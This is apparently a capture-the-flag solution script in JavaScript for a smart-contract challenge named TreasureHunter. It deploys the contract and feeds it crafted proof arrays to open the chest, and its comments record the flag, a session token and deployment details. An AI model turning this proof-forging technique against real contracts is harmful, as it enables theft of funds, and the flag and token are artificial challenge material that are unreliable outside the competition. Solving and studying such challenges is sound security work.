//[+] deployer account: 0x01321013F4eFcC9a8DB9edff8f70e7d70Af7cC99
//[+] token: v4.local.8CI1a6PVfO4ZBsL5ANWBQzQxDfzg91jOgxuRGuP9ysH8GQt3HCQozcVx-Hx_ekTKipDrFCIOu8VIJ_HSck08tTZnttoOaN_1WFR9AXeX3aQl2LBTvn9kg9BCk1pGU4OHH1vqrtv6hB-yahLSKxlxR2rTqcRIPtVe0s7l7OBmK_ITFQ
//[+] contract address: 0xf0F3e7f73bE3E5FC84E1e16456e53BE0b082aC09
//rwctf{th3r3_1$_nothing_1n_7h3_7r3a5ure_chest_f7h9fupa9xabbq7a}
//[+] transaction hash: 0xcddfe3aad6339e1f6155c710d40c4eee4d41c040dc59e7ef35734d7623876e5b
const hre = require("hardhat");
const w3 = require("web3")

function to_bytes32(val){
    return "0x"+w3.utils.padLeft(val, 64);
}

async function main() {
    await hre.run('compile');

    const th_c = await hre.ethers.getContractFactory("TreasureHunter");
    const th_i = await th_c.deploy();

    await th_i.deployed();

    let current_root = await th_i.root();
    console.log("root -> ", current_root);

    let vm = [
        to_bytes32("4c"),
        to_bytes32("50"),
        to_bytes32("01"),
        "0xe9f810898db8dc62342eaa122fd26525362f2b70bd462edef6e4e34093d66c17",
        to_bytes32("50"),
        to_bytes32("01"),
        "0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2",
    ]

    await th_i.enter(vm);
    await th_i.pickupTreasureChest(vm);

    let vm2 = [
        to_bytes32("4c"),
        to_bytes32("50"),
        to_bytes32("01"),
        "0xe9f810898db8dc62342eaa122fd26525362f2b70bd462edef6e4e34093d66c17",
        to_bytes32("50"),
        to_bytes32("01"),
        "0xa3c1274aadd82e4d12c8004c33fb244ca686dad4fcc8957fc5668588c11d9502",
        to_bytes32("50"),
        to_bytes32("01"),
        "0xba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2",
    ]

    await th_i.findKey(vm2);

    await th_i.openTreasureChest();
    let pp = await th_i.isSolved();
    console.log(pp);

}

let f = w3.utils.sha3(("0xe9f810898db8dc62342eaa122fd26525362f2b70bd462edef6e4e34093d66c17"+"a3c1274aadd82e4d12c8004c33fb244ca686dad4fcc8957fc5668588c11d9502"))

f = w3.utils.sha3((f+"ba13a52ab72064627701ac75ab564f7e786d093c655849458536cc689abdf8e2"))
console.log(f)


main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });

